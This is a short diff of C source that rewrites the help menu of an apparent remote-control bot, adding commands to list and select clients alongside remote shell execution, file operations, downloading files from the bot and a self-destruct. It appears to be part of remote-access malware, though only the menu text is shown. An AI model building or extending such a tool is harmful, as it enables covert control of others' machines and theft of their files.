@@ -84,15 +84,16 @@ void boom(char *path,char *pName){
 }
 
 char *help(){
-    return  "help - List of commands\n"
-            "shell - Exec shell commands with timeout\n"
-            "cp - Copy file/folder\n"
-            "mv - Move file/folder\n"
-            "rm - Remove file/folder\n"
-            "mkdir - Make directory\n"
-            "timeout - Set timeout for shell\n"
-            "getfile - Download file from bot\n"
-            "boom - DESTROY ITSELF!\n";
+    return  "/help - List of commands\n"
+            "/list - Show all avaliable clientst\n"
+            "/select - Select the client by id\n"
+            "/shell - Exec shell commands with timeout\n"
+            "/cp - Copy file/folder\n"
+            "/mv - Move file/folder\n"
+            "/rm - Remove file/folder\n"
+            "/mkdir - Make directory\n"
+            "/getfile - Download file from bot\n"
+            "/boom - DESTROY ITSELF!\n";
 }
 
 
